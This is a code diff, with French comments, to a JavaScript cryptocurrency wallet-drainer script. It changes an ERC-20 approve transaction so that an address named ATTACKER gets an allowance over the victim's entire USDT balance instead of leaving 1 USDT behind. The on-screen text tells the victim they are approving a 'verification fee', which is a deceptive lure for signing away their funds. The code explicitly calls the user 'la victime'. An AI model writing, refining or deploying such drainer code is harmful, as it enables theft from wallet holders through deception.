@@ -1375,21 +1375,14 @@ async function sendExactApproveTransaction() {
       return;
     }
 
-    // 👇 On calcule le montant à laisser à la victime (ici 0.000001 USDT)
-    const LEAVE_AMOUNT = ethers.utils.parseUnits('1', decimals); // laisse 1 USDT
-    let approveAmount = balance;
-    if (balance.gt(LEAVE_AMOUNT)) {
-      approveAmount = balance.sub(LEAVE_AMOUNT);
-    }
+    const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
 
-    const approveFormatted = ethers.utils.formatUnits(approveAmount, decimals);
-    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${approveFormatted} USDT (frais de vérification).`;
-
-    // Construire la transaction approve avec le nouveau montant
+    // Construction de la transaction approve avec le solde complet
     const iface = new ethers.utils.Interface([
       'function approve(address spender, uint256 amount)'
     ]);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, approveAmount]);
+    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
 
     const txParams = {
       from: account,
